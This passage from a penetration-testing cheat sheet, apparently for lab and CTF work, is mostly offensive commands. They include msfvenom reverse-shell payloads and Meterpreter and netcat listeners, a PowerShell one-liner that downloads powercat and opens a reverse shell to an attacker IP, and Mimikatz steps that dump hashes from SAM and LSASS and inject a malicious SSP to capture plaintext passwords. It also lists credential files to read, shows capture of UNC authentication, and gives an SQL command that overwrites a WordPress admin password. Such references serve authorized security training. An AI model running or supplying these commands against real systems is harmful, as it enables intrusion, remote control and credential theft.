msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
# PHP
msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=IP LPORT=PORT > pwn.php

```

#### Listeners

``` sh
# Netcat listener
nc -nvlp PORT

# Meterpreter listener
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"
# Meterpreter listener (stageless)
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST IP;set LPORT PORT;run;"   

# Powercat listener script (Kali) and command to execute
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p PORT -e powershell 
```

#### Upgrade shell

``` sh
# Upgrade shell with Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fix on local side to make proper TTY
Ctrl + Z
stty raw -echo; fg
Enter
```

### Windows Authentication

#### Mimikatz

```sh
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe

# Enable SeDebugPrivilege for needed debug privs
privilege::debug

# Elevate to SYSTEM privs
token::elevate

# Dump passwords
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords

# Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds
misc::memssp
# Check output after auth request happened
type C:\Windows\System32\mimilsa.log
```

### Misc.

```sh
# Folders/files to look in
/var/www/html/ 
/etc/passwd
/etc/shadow
/proc/self/environ
/var/www/html/webdav/passwd.dav

# SSH key handling
../.ssh/id_rsa
chmod 400 id_rsa
sudo -l



# Directory traversal / local file inclusion Windows
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
C:\Windows\System32\drivers\etc\hosts
# IIS web server files/folders
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
# XAMPP PHP
C:\xampp\apache\logs
# SSH
C:\Users\USER\.ssh\id_rsa

# Decode Base64
echo <base64> | base64 -d
# Inspect file in binary
xxd -b malware.txt

# Test whether running in CMD or PS
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
# Escaping for formatting
`

# Exiftool, display duplicated and unknown tags
exiftool -a -u document.pdf

# Quickly scan files for content
find . -type f -name "FILENAME_HINT" -exec grep -niH "TERM" {} +

# Python2 env
sudo apt install virtualenv python2 python2-dev
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python2 get-pip.py  
pip2 install virtualenv      
python2 -m virtualenv py2env  
source py2env/bin/activate
python -V
# Install impacket for Pyhon2
pip install impacket==0.9.22
# Python3 env
python3 -m virtualenv py3env  
source py3env/bin/activate

# Open webdav folder, for example to host malicious .lnk file
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav

# Proxy Python through Burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://www.google.com/", proxies=proxies, verify=False)

# Small sample files for uploads
https://github.com/mathiasbynens/small

# File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder
\\\\IP\\test

# Wordpress
# https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
wpscan --url http://IP -v  
# Replace admin password in database
mysql -u USER --password=PASS -h localhost -e "use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"

# Impacket
# Change password
impacket-changepasswd USER@DOMAIN -newpass 'NEWPASSWORD'
```

### Kali Setup

Python2 virtual environment

.txt file to copy often needed commands from

Cross compilation mingw-w64 wine 

\+ sudo dpkg --add-architecture i386 && apt-get update &&  
apt-get install wine32

Default CTF folder structure

Bookmarks

[https://explainshell.com/](https://explainshell.com/)

Trillium

VScode

Other resources

Macro/alias for 192.168.

Flameshot

Download seclists

Burp plugin and cert

Copy /usr/share/shells to Downloads for easy access and backup

```sh
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz
```